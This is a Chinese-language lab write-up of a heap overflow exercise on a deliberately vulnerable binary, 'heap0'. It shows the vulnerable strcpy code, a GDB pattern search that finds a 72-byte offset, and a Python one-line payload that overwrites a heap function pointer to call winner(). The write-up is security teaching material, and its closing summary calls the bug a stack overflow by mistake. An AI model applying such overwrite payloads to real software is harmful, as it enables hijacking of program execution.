# 堆溢出实验1

## 实验概述

### 【目的】
1. 运行heap0，得到输出`level passed`
### 【环境】
Linux
### 【工具】
python,IDA pro
### 【原理】
堆溢出是堆数据区中发生的一种缓冲区溢出。 堆溢出以与基于栈溢出不同的方式被利用。 堆上的内存由应用程序在运行时动态分配，通常包含程序数据。 通过以特定的方式破坏这些数据来执行开发，以使应用程序覆盖诸如链接列表指针的内部结构。 规范堆溢出技术覆盖动态内存分配链接（如malloc元数据），并使用生成的指针交换来覆盖程序函数指针。
## 实验步骤

### 【步骤】
#### heap0
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *dest; // ST14_4@1
  _DWORD *v4; // eax@1
  void (__stdcall **v5)(_DWORD); // ST18_4@1
  int v7; // [sp-4h] [bp-14h]@0

  dest = (char *)malloc(0x40u);
  v4 = malloc(4u);
  v5 = (void (__stdcall **)(_DWORD))v4;
  *v4 = nowinner;
  printf("data is at %p, fp is at %p\n", dest, v4);
  strcpy(dest, argv[1]);
  (*v5)(v7);
  return 0;
}
int winner()
{
  return puts("level passed");
}
```
连续分配了两个堆块，并对第一个堆块用`strcpy()`，即可以通过溢出第一个堆块从而改写第二个堆块的数据。那么改写第二个堆块的函数指针指向`winner()`，当运行到`(*v5)(v7);`，就会运行函数`winner()`，得到输出`level passed`。

不了解堆的数据结构的话，很难算出溢出点的偏移量，这里介绍一种寻找溢出点的方法。
```
$ gdb heap0 -q
GEF for linux ready, type `gef' to start, `gef config' to configure
66 commands loaded for GDB 7.11.1 using Python engine 3.5
[*] 1 commands could not be loaded, run `gef missing` to know why.
Reading symbols from heap0...(no debugging symbols found)...done.
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
gef➤  r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Starting program: /home/lometsj/prostar/heap0 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
data is at 0x804b008, fp is at 0x804b050

Program received signal SIGSEGV, Segmentation fault.
0x61616173 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x61616173 ("saaa"?)
$ebx   : 0xffffcee0  →  0x00000002
$ecx   : 0xffffd1f0  →  "aaxaaayaaa"
$edx   : 0x0804b062  →  "aaxaaayaaa"
$esp   : 0xffffceac  →  0x0804853f  →  <main+114> mov eax, 0x0
$ebp   : 0xffffcec8  →  0x00000000
$esi   : 0xf7fb6000  →  0x001afdb0
$edi   : 0xf7fb6000  →  0x001afdb0
$eip   : 0x61616173 ("saaa"?)
$eflags: [carry parity adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023  $es: 0x002b  $ss: 0x002b  $ds: 0x002b  $fs: 0x0000  $gs: 0x0063  
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
0xffffceac│+0x00: 0x0804853f  →  <main+114> mov eax, 0x0	 ← $esp
0xffffceb0│+0x04: 0x00000002
0xffffceb4│+0x08: 0xffffcf74  →  0xffffd17a  →  "/home/lometsj/prostar/heap0"
0xffffceb8│+0x0c: 0x0804b008  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
0xffffcebc│+0x10: 0x0804b050  →  "saaataaauaaavaaawaaaxaaayaaa"
0xffffcec0│+0x14: 0xffffcee0  →  0x00000002
0xffffcec4│+0x18: 0x00000000
0xffffcec8│+0x1c: 0x00000000	 ← $ebp
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────
[#0] Id 1, Name: "heap0", stopped, reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search 0x61616173
[+] Searching '0x61616173'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 69 (big-endian search) 
```
可以找到溢出点是72。

查找`winner()`的地址。
```
$ objdump -d heap0 | grep winner
0804849b <winner>:
080484b4 <nowinner>:

```
所以有
```
$ python -c 'print "a"*72 + "\x9b\x84\x04\x08"'| xargs ./heap0
data is at 0x86ab008, fp is at 0x86ab050
level passed

```

### 【总结】
本次实验主要体验Linux环境下堆溢出的发生场景，并尝试通过堆溢出覆盖（修改）相邻的堆块数据，达到改变程序执行流的目的。
可以发现，要使栈溢出发生，要满足以下条件：

- 程序允许用户输入
- 程序对用户的输入长度不加检查

栈溢出攻击是最为普遍而又危害极大的漏洞，要防御栈溢出攻击，首先要有良好的编码功力，对于用户的输入数据要做严格的长度检查，避免使用危险的函数。

